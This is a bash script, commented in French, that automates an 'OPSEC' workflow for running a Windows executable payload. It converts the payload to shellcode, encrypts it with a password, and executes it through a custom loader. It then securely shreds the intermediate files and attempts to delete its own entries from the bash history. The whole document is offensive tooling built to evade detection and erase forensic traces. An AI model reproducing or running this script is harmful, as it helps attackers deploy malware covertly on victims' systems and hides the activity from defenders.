#!/bin/bash
# Usage: ./opsec_run.sh <payload.exe> <password>
# Script d'automatisation du workflow OPSEC avec gestion d'erreurs améliorée

# Définir une fonction de gestion d'erreur
handle_error() {
    local msg="$1"
    local code="${2:-1}"
    echo "[-] $msg" >&2
    
    # Nettoyage en cas d'erreur
    if [ -n "$TMP" ] && [ -d "$TMP" ]; then
        if [ -f "$SC" ]; then
            echo "[*] Nettoyage du shellcode non chiffré..." >&2
            shred -u "$SC" 2>/dev/null || rm -f "$SC"
        fi
        
        if [ -f "$ENC" ]; then
            echo "[*] Nettoyage du shellcode chiffré..." >&2
            shred -u "$ENC" 2>/dev/null || rm -f "$ENC"
        fi
        
        rmdir "$TMP" 2>/dev/null
    fi
    
    exit "$code"
}

# Vérifier les arguments
if [ $# -lt 2 ]; then
    handle_error "Usage: $0 <payload.exe> <password>"
fi

EXE="$1"
PWD="$2"
TMP=$(mktemp -d)

# Vérifier que le répertoire temporaire a été créé
if [ ! -d "$TMP" ]; then
    handle_error "Impossible de créer un répertoire temporaire"
fi

SC="$TMP/sc.bin"
ENC="$TMP/enc.bin"

echo "[*] Vérification des prérequis..." >&2

# Vérifier l'existence du fichier d'entrée
if [ ! -f "$EXE" ]; then
    handle_error "Le fichier $EXE n'existe pas"
fi

# Vérifier que les outils nécessaires existent
if ! command -v python3 >/dev/null 2>&1; then
    handle_error "Python3 est requis mais n'est pas installé"
fi

if [ ! -f "./custom_pe2sc.py" ]; then
    handle_error "custom_pe2sc.py est introuvable"
fi

if [ ! -f "./encrypt_shell.py" ]; then
    handle_error "encrypt_shell.py est introuvable"
fi

if [ ! -x "./opsec_loader" ]; then
    handle_error "opsec_loader est introuvable ou non exécutable"
fi

echo "[*] Conversion PE→Shellcode..." >&2

# 1. Conversion PE vers Shellcode avec notre convertisseur personnalisé
# Conserver les erreurs pour le diagnostic
python3 custom_pe2sc.py "$EXE" "$SC" || handle_error "Échec conversion shellcode"

# Vérifier que le fichier existe ET a une taille > 0
if [ ! -f "$SC" ] || [ ! -s "$SC" ]; then
    handle_error "Le shellcode généré est vide ou manquant"
fi

echo "[*] Chiffrement du shellcode..." >&2

# 2. Chiffrement avec encrypt_shell.py incluant une vérification
python3 encrypt_shell.py "$SC" "$PWD" "$ENC" --verify || handle_error "Échec chiffrement"

# Vérifier le fichier chiffré
if [ ! -f "$ENC" ] || [ ! -s "$ENC" ]; then
    handle_error "Le shellcode chiffré est vide ou manquant"
fi

# Nettoyage immédiat du shellcode non chiffré
echo "[*] Nettoyage du shellcode non chiffré..." >&2
shred -u "$SC" 2>/dev/null || rm -f "$SC"

echo "[*] Exécution..." >&2

# 3. Exécution avec opsec_loader
./opsec_loader "$ENC" "$PWD"
RET=$?

# Vérifier le code de retour
if [ $RET -ne 0 ]; then
    echo "[-] L'exécution a échoué avec le code $RET" >&2
else
    echo "[+] Exécution terminée avec succès" >&2
fi

# 4. Nettoyage final
echo "[*] Nettoyage des traces..." >&2
shred -u "$ENC" 2>/dev/null || rm -f "$ENC"
rmdir "$TMP" 2>/dev/null

# Supprimer les entrées d'historique bash si possible
if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
    echo "[*] Nettoyage de l'historique..." >&2
    history -d $(history | grep "$0" | awk '{print $1}') 2>/dev/null
fi

exit $RET